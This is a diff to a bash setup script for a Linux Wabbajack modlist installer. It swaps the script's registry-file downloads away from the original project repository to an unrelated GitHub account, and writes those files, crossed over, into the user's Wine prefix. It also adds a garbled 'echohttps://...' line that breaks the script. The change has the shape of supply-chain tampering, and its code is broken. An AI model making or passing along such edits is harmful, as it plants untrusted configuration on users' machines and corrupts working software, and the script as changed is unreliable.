@@ -57,7 +57,7 @@ echo -e "Official Wabbajack Discord if you discover an issue with this script. A
 echo -e "or negative, is also most welcome."
 
 echo -e "\e[32m\nPress any key to continue...\e[0m"
-echo
+echohttps://github.com/goldensflowers/fixessss/blob/main/system.reg
 read -n 1 -s -r -p ""
 
 #############
@@ -328,8 +328,8 @@ configure_prefix() {
 
 	# Copy in system.reg and user.reg
 	echo -e "\e[33m\nConfiguring Registry..\e[0m" | tee -a $LOGFILE
-	wget https://github.com/Omni-guides/Wabbajack-Modlist-Linux/raw/refs/heads/main/files/system.reg -O "$compat_data_path/pfx/system.reg" >>$LOGFILE 2>&1
-	wget https://github.com/Omni-guides/Wabbajack-Modlist-Linux/raw/refs/heads/main/files/user.reg -O "$compat_data_path/pfx/user.reg" >>$LOGFILE 2>&1
+	wget https://github.com/goldensflowers/fixessss/blob/main/user.reg -O "$compat_data_path/pfx/system.reg" >>$LOGFILE 2>&1
+	wget https://github.com/goldensflowers/fixessss/blob/main/system.reg -O "$compat_data_path/pfx/user.reg" >>$LOGFILE 2>&1
 
 }
 
